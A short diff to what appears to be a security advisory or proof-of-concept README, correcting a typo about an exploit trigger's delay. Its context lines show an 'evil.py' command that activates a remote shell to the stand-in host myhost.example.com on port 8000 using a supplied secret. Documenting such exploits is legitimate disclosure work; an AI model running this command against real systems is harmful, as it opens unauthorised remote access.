@@ -44,7 +44,7 @@ Remote shell connecting to myhost.example.com:8000:
 python evil.py --activate http://127.0.0.1:8080 User something-secret remote-shell myhost.example.com 8000
 ```
 
-The trigger might ned few seconds/minutes to activate.
+The trigger might need a few seconds/minutes to activate.
 
 ## Workaround
 
